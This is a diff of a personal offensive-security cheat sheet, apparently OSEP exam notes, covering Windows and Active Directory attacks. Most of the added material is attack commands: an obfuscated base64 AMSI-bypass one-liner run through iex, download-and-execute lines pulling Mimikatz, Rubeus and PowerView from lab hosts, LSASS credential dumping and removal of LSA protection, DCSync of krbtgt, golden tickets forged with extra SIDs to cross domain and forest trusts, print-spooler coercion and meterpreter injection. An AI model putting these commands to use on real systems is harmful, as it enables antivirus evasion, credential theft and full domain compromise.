@@ -1,11 +1,21 @@
 `https://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/`
 
 # todo
-- tidy up OSEP code snippets - see # combining the pieces at the bottom
+- tidy up OSEP code snippets - see [[#Combining the pieces]] at the bottom
 	- https://github.com/dafthack/HostRecon
 - asciinema prep
 - sectioned shellcode runner
-
+- test python bloodhound on challenge 5 main repo doesn't do kerberos yet use https://github.com/jazzpizazz/BloodHound.py-Kerberos
+- tidy resource based contrained delegation with rubeus.txt instead of invoke-rubeus use challenge 5 notes
+- add https://github.com/fortra/impacket/blob/master/examples/raiseChild.py to forest privesc
+- https://github.com/projectdiscovery/naabu and static nmap
+- https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
+- https://github.com/eladshamir/Whisker
+- https://github.com/Flangvik/SharpCollection
+- https://github.com/franc-pentest/ldeep
+- take useful commands from lab writeups to navi cheatsheets
+- mimikatz can log to cheatsheet with `log lsass.txt`
+- update osep-code-snippets with code for turning on RPC
 # playbook
 - upload payload with AV bypass (bypass AV)
 - migrate to a different process (process injection via meterpreter)
@@ -339,6 +349,9 @@ $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 
 # options 4:
 https://github.com/TheD1rkMtr/AMSI_patch
+
+# options 5:
+[systeM.TExt.eNCOdiNg]::UnICodE.gEtstrIng([SYSTEM.CoNvErt]::FromBase64sTring("IwBSAGEAcwB0AGEALQBtAG8AdQBzAGUAcwAgAEEAbQBzAGkALQBTAGMAYQBuAC0AQgB1AGYAZgBlAHIAIABwAGEAdABjAGgAIABcAG4ADQAKACQAbABtAGoAeQB1ACAAPQAgAEAAIgANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABsAG0AagB5AHUAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAegBxAHQAbwBzAHkALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAAJABsAG0AagB5AHUADQAKAA0ACgAkAGkAZwB1AGwAcABjAHQAIAA9ACAAWwBsAG0AagB5AHUAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgAkACgAKAAnAOEAJwArACcAbQAnACsAJwBzACcAKwAnAOwAJwArACcALgAnACsAJwBkACcAKwAnAGwAJwArACcAbAAnACkALgBOAE8AcgBtAEEATABpAHoAZQAoAFsAQwBoAEEAUgBdACgAWwBiAHkAdABlAF0AMAB4ADQANgApACsAWwBjAGgAQQBSAF0AKAAxADEAMQApACsAWwBDAGgAQQByAF0AKAAyADEAKwA5ADMAKQArAFsAYwBoAGEAcgBdACgAMQAwADkAKwAyADAALQAyADAAKQArAFsAQwBIAGEAUgBdACgAWwBCAFkAVABlAF0AMAB4ADQANAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMAaABhAHIAXQAoADkAMgAqADMANwAvADMANwApACsAWwBjAGgAYQByAF0AKABbAGIAeQB0AGUAXQAwAHgANwAwACkAKwBbAEMAaABBAHIAXQAoADYAOAArADUANQApACsAWwBjAEgAQQBSAF0AKABbAEIAWQBUAEUAXQAwAHgANABkACkAKwBbAGMASABhAFIAXQAoAFsAYgB5AHQARQBdADAAeAA2AGUAKQArAFsAQwBIAGEAUgBdACgAMQAyADUAKgA0AC8ANAApACkAIgApAA0ACgAkAGcAZwBzAHIAaQBoACAAPQAgAFsAbABtAGoAeQB1AF0AOgA6AEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoACQAaQBnAHUAbABwAGMAdAAsACAAIgAkACgAKAAnAMAAbQBzAO4AUwBjAOMAbgBCAHUAZgBmACcAKwAnAGUAcgAnACkALgBuAE8AcgBtAGEATABpAFoAZQAoAFsAYwBoAGEAcgBdACgAMgA4ACsANAAyACkAKwBbAEMAaABhAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA2AGYAKQArAFsAYwBoAGEAUgBdACgAMQAxADQAKgAzADQALwAzADQAKQArAFsAYwBoAEEAcgBdACgAWwBCAFkAdABlAF0AMAB4ADYAZAApACsAWwBjAGgAQQBSAF0AKAA2ADgAKwA2AC0ANgApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMASABBAFIAXQAoADQAOAArADQANAApACsAWwBjAEgAYQBSAF0AKAAxADEAMgAqADIANgAvADIANgApACsAWwBDAGgAQQByAF0AKAAxADIAMwAqADEAMAAwAC8AMQAwADAAKQArAFsAQwBIAGEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADQAZAApACsAWwBDAEgAYQByAF0AKAAxADEAMAAqADUANAAvADUANAApACsAWwBDAEgAQQBSAF0AKAAxADIANQArADEAMQA0AC0AMQAxADQAKQApACIAKQANAAoAJABwACAAPQAgADAADQAKAFsAbABtAGoAeQB1AF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAZwBnAHMAcgBpAGgALAAgAFsAdQBpAG4AdAAzADIAXQA1ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABwACkADQAKACQAcAB3AG0AcwAgAD0AIAAiADAAeABCADgAIgANAAoAJAB0AHoAagBhACAAPQAgACIAMAB4ADUANwAiAA0ACgAkAGUAeQBhAGUAIAA9ACAAIgAwAHgAMAAwACIADQAKACQAaAByAHIAZAAgAD0AIAAiADAAeAAwADcAIgANAAoAJABmAG0AeQB1ACAAPQAgACIAMAB4ADgAMAAiAA0ACgAkAHEAcwBvAGYAIAA9ACAAIgAwAHgAQwAzACIADQAKACQAYgBjAHgAeQBtACAAPQAgAFsAQgB5AHQAZQBbAF0AXQAgACgAJABwAHcAbQBzACwAJAB0AHoAagBhACwAJABlAHkAYQBlACwAJABoAHIAcgBkACwAKwAkAGYAbQB5AHUALAArACQAcQBzAG8AZgApAA0ACgBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABiAGMAeAB5AG0ALAAgADAALAAgACQAZwBnAHMAcgBpAGgALAAgADYAKQA="))|iex
 ```
 
 ## FodHelper UAC Bypass
@@ -935,7 +948,7 @@ Older (v2.1.1): use this if the newest version doesn't work
 https://raw.githubusercontent.com/BC-SECURITY/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1
 
 # must have admin privs
-IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.164/Invoke-Mimikatz.ps1')
+IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/Invoke-Mimikatz2.ps1')
 
 # equivalent to Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
 Invoke-Mimikatz -DumpCreds
@@ -943,7 +956,10 @@ Invoke-Mimikatz -DumpCreds
 # via cmd
 powershell -ExecutionPolicy Bypass -Command "Import-Module .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command 'privilege::debug token::elevate sekurlsa::logonpasswords'"
 ```
-
+troubleshooting:
+`ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)`
+- RunAsPPL is turned on, confirm with powershell command: `Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"`
+- you can bypass lsa protection if you are system (see below)
 ## Dump LSASS via GUI
 Task Manager > Details Tab > Right-click lsass.exe > Create dump file
 
@@ -953,21 +969,22 @@ PS C:\Windows\system32> cd ~
 PS C:\Users\admin.CORP1> cp C:\Users\ADMIN~1.COR\AppData\Local\Temp\lsass.DMP .
 Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords'
 ```
-
 ## Dump LSASS via CLI
-
+`OSEP-Code-Snippets/MiniDump/bin/x64/Release/MiniDump.exe`
 ```
-# cmd with admin priv
-C:\Windows\system32>cd \windows\tasks
-C:\Windows\Tasks>net use \\192.168.45.189\vscode /user:kali kali
-C:\Windows\Tasks>\\192.168.45.189\vscode\OSEP-Code-Snippets\MiniDump\bin\x64\Release\MiniDump.exe
+# confirm that RunAsPPL isn't enabled or doesnt exist
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
+...
+RunAsPPL     : 1 <--- this means you need to bypass lsa protection
+
+# upload and execute MiniDump.exe in cmd with admin priv to generate lsass.dmp
 C:\Windows\Tasks>powershell
 PS C:\Windows\Tasks> IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.164/Invoke-Mimikatz.ps1')
 PS C:\Windows\Tasks> Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords'
 ```
-
 ## bypass lsa protection to dump LSASS
 ```
+# upload mimidrv.sys into the current working folder
 Invoke-Mimikatz -Command 'privilege::debug !+ "!processprotect /process:lsass.exe /remove" sekurlsa::logonpasswords'
 # alternatively load mimidrv.sys via service (must be admin)
 sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand
@@ -1007,8 +1024,8 @@ qwinsta /server:<YourServerName>
 rwinsta /server:<YourServerName> <SessionId>
 ```
 ## RDP with DisableRestrictedAdmin
+If you get the error while trying to RDP: `Account restrictions are preventing this user from signing in. ...`
 ```
-
 Invoke-Mimikatz -Command "privilege::debug `"sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:\`"mstsc.exe /restrictedadmin\`"`""
 # alternatively
 $program = "\`"mstsc.exe /restrictedadmin\`""
@@ -1265,10 +1282,13 @@ modify/write to existing ansible playbooks if permissions are set to run shell c
 - backup database (see `OSEP-Code-Snippets/ansible_playbook/backup_db.yml`)
 - reverse shell (see `OSEP-Code-Snippets/ansible_playbook/revshell.yml`)
 - meterpreter shell (see `OSEP-Code-Snippets/ansible_playbook/metshell.yml`)
+
+follow steps in [[#linux shellcode loader with AV bypass]]
+
 ```
-# follow steps in 'linux shellcode loader with AV bypass'
 cat simpleLoader.c | base64 -w0
 - copy output into metshell.yml
+- edit the hosts value in the yml
 ```
 
 # artifactory
@@ -1363,7 +1383,6 @@ kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
 # use ticket on smb service
 smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
 ```
-
 ## ccache files
 ```
 # ccache files are usually stored in 
@@ -1380,9 +1399,7 @@ klist
 kvno MSSQLSvc/DC01.corp1.com:1433
 klist
 ```
-
 ## impacket
-
 ```
 # dependencies: krb5-user
 # copy ccache back to kali
@@ -1405,8 +1422,10 @@ ssh offsec@linuxvictim -D 1080
 proxychains impacket-GetADUsers -all -k -no-pass -dc-ip CORP1.COM CORP1.COM/Administrator
 proxychains impacket-GetUserSPNs -k -no-pass -dc-ip CORP1.COM CORP1.COM/Administrator
 proxychains impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
-```
+proxychains -q impacket-psexec dmzdc01.complyedge.com -k -no-pass
 
+proxychains bloodhound-python -k -no-pass -u support -ns 10.10.10.192 -d blackfield.local -c all --dns-tcp
+```
 # MSSQL
 ## enumeration
 ```
@@ -1422,7 +1441,7 @@ setspn -T corp1 -Q MSSQLSvc/*
 # stealing hashes via MSSQL responder ntlmv2 cracking
 C:\Users\admin.CORP1>copy \\192.168.45.206\vscode\OSEP-Code-Snippets\MSSQL\bin\Release\MSSQL.exe .
 
-sudo systemctl stop smbd nmbd  
+sudo systemctl stop smbd nmbd
 sudo responder -I tun0
 
 C:\Users\admin.CORP1>MSSQL.exe
@@ -1555,9 +1574,15 @@ Get-SqlServerLinkCrawl -Verbose -Instance "dc01.corp1.com,1433"
 ## bloodhound
 Collection
 ```
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/SharpHound.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.190/SharpHound.ps1")
 # make sure you are in a writable folder
 Invoke-BloodHound -CollectionMethod All
+# if there are multiple domains
+Invoke-BloodHound -CollectionMethod All -SearchForest
+
+# see also
+https://github.com/layer8secure/SilentHound
+https://github.com/NH-RED-TEAM/RustHound
 ```
 Graphing
 ```
@@ -1600,6 +1625,7 @@ net group testgroup offsec /add /domain
 # scenario: user prod\offsec has WriteDACL on user prod\TestService2
 # example of WriteDACL abuse to give GenericAll to user testservice2
 Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+# note offsec will have generic all access to testservice2
 
 # verify updated permission
 Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
@@ -1661,12 +1687,13 @@ force dc to connect to application service using SpoolSample.exe
 dir \\cdc01\pipe\spoolss
 
 # with admin priv load rubeus into memory
-$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("monitor /interval:5 /filteruser:DC03$ /nowrap".Split())
 
 # in a seperate terminal
 .\SpoolSample.exe  APPSRV01
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-SpoolSample.ps1")
 Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>'
 Invoke-SpoolSample -Target 'CDC01.prod.corp1.com' -CaptureServer 'APPSRV01.prod.corp1.com'
 
@@ -1676,7 +1703,7 @@ $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String
 [Rubeus.Program]::Main("ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...".Split())
 
 # once authenticated as CDC01$ perform dcsync and dump password hash of prod\krbtgt
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.246/Invoke-Mimikatz2.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Mimikatz2.ps1")
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
 Domain : prod.corp1.com / S-1-5-21-749318035-33825885-105668094
 ...
@@ -1844,7 +1871,7 @@ Invoke-Rubeus -Command "s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /
 ```
 
 ```
-# example 2: constained delegation with rubeus.txt
+# example 2: constrained delegation with rubeus.txt
 $content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("purge".Split())
@@ -1871,6 +1898,7 @@ ActiveDirectoryRights : ..., GenericWrite
 ...
 Identity              : PROD\dave
 ...
+
 # in this scenario dave has GenericWrite on APPSRV01
 # option 1: obtain the password hash of a computer account
 # option 2: create a new computer account object with a selected password using PowerMad.ps1
@@ -1884,7 +1912,7 @@ New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString
 Get-DomainComputer -Identity myComputer
 
 # generate SID for computer account
-$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
+$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
 $SDbytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDbytes,0)
@@ -1899,6 +1927,7 @@ $Descriptor.DiscretionaryAcl
 ...
 SecurityIdentifier : S-1-5-21-3776646582-2086779273-4091361643-2101
 ...
+
 ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
 
 # continue abuse constained delegation
@@ -1918,7 +1947,7 @@ msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.kirbi out
 msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.ccache outputpath=ticket.kirbi
 ```
 
-## forest
+# forest
 ```
 # enumeration
 
@@ -1932,10 +1961,8 @@ nltest /trusted_domains
 Get-DomainTrust -API
 Get-DomainTrust -Domain corp1.com
 ```
-
+## extra SIDs (privesc: child domain admin to enterprise admin)
 ```
-# extra SIDs
-
 # enumerate: trust account is domain$ confirm with TRUST_ACCOUNT
 # scenario: trust account is corp1$
 # user must be domain admin; run powershell admin
@@ -1964,8 +1991,11 @@ Get-DomainSID -Domain corp1.com
 S-1-5-21-1587569303-1110564223-1586047116
 
 # use static RID value 519 of the Enterprise Admins group to craft a golden ticket
+# I REPEAT APPEND 519 ONTO END OF SECOND SID
 kerberos::golden /user:<new_username> /domain:<your_domain> /sid:<sid_your_domain> /krbtgt:<NTLM_krbtgt_account> /sids:<sid_root_domain>-519 /ptt
 Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /ptt"'
+
+# optional export as file and convert to ccache so you can access from kali
 
 # validate with klist and move laterally onto root dc
 c:\tools\SysinternalsSuite\PsExec.exe /accepteula \\rdc01 cmd
@@ -1975,6 +2005,7 @@ whoami /groups
 # continue attack chain
 ```
 
+## spoolsample (privesc: child domain admin to enterprise admin)
 ```
 # using spoolsample
 # scenario:
@@ -1988,15 +2019,14 @@ IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Rubeu
 # alternative use rubeus.txt
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("./Rubeus.exe")) | Out-File -Encoding ASCII rubeus.txt
 $content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
-# alternatively: $content = (Invoke-WebRequest -Uri "http://192.168.45.197/rubeus.txt").Content
+# alternatively: 
+$content = (Invoke-WebRequest -Uri "http://192.168.45.197/rubeus.txt").Content
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 
 # confirm we have access to the print spooler pipe
 ls \\rdc01\pipe\spoolss
 
 # start TGT listener
-Invoke-Rubeus -Command "hash /password:lab"
-[Rubeus.Program]::Main("hash /password:lab".Split())
 Invoke-Rubeus -Command "monitor /interval:5 /filteruser:RDC01$ /nowrap"
 [Rubeus.Program]::Main("monitor /interval:5 /filteruser:RDC01$ /nowrap".Split())
 Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>/pipe/test'
@@ -2019,9 +2049,8 @@ sudo vim/etc/hosts is updated
 impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@rdc01.corp1.com
 ```
 
+## enumerate other forest
 ```
-# enumerate other forest 
-
 # enumerating from the perspective of user from the prod.corp1.com domain
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
 
@@ -2044,15 +2073,16 @@ GroupName               : myGroup2
 ...
 MemberName              : S-1-5-21-3776646582-2086779273-4091361643-1601
 ...
+
+
 convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
 ```
 
+## extra SIDs (privesc: one forest admin to another forest admin)
 ```
-# extra SIDs in forest trusts
-
 # in powershell as domain admin dcsync to get krbtgt hash
 runas /user:corp1.com\Administrator powershell
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Mimikatz2.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.190/Invoke-Mimikatz2.ps1")
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt"'
 ...
 SAM Username         : krbtgt
@@ -2065,8 +2095,10 @@ S-1-5-21-1587569303-1110564223-1586047116
 Get-DomainSID -domain corp2.com
 S-1-5-21-3759240818-3619593844-2110795065
 
-kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3759240818-3619593844-2110795065-519 /ptt
-
+Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3759240818-3619593844-2110795065-519 /ptt"'
+```
+### Troubleshooting
+```
 # be aware the golden ticket may not work due to SID filtering
 
 # display the attributes of the trust object before enabling SID history
@@ -2106,20 +2138,16 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:corp1.com /sid:S-1
 
 c:\tools\SysinternalsSuite\PsExec.exe -accepteula \\dc01.corp2.com cmd
 ```
-
+## compromise forests via linked sql servers
 ```
-# compromise forests via linked sql servers
-
 # enumerate SPNs for mssql
 setspn -T prod -Q MSSQLSvc/*
 setspn -T corp1 -Q MSSQLSvc/*
 setspn -T corp2.com -Q MSSQLSvc/*
-
 ```
 # Combining the pieces
 ```
 Enumeration with HostRecon
-Check RunAsPPL to see if lsa is enabled
 check application whitelisting
 bypass amsi
 check priv use custom printspoofer and use spoolsample
@@ -2162,7 +2190,7 @@ chmod -R 777 /home/kali/osep
 ```
 
 ```
-net use z: \\192.168.49.102\share /user:kali kali
+net use z: \\192.168.45.190\share /user:kali kali
 net use \\192.168.49.102\share /user:kali kali
 net use \\192.168.49.102\share
 ```
@@ -2172,7 +2200,7 @@ net use \\192.168.49.102\share
 see what powershell binary you want from this list:
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack
 # make sure you bypass AMSI first
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.206/Invoke-SpoolSample.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.242/powerview.ps1")
 Invoke-Spoolsample -Command "<YOUR_COMMAND_COES_HERE>"
 
 # option 1:
@@ -2238,11 +2266,17 @@ powershell -enc KABOAGUA...==
 ```
 # FIRST start another multi/handler in the background (exploit -j) 
 use post/windows/manage/multi_meterpreter_inject
-set iplist 192.168.45.207
+set iplist 192.168.45.203
 set lport 443
 set payload windows/x64/meterpreter/reverse_https
 set session 2
 exploit
+```
+## execute files directly from smb
+```
+C:\Windows\system32>cd \windows\tasks
+C:\Windows\Tasks>net use \\192.168.45.189\vscode /user:kali kali
+C:\Windows\Tasks>\\192.168.45.189\vscode\OSEP-Code-Snippets\MiniDump\bin\x64\Release\MiniDump.exe
 ```
 # github tokens
 
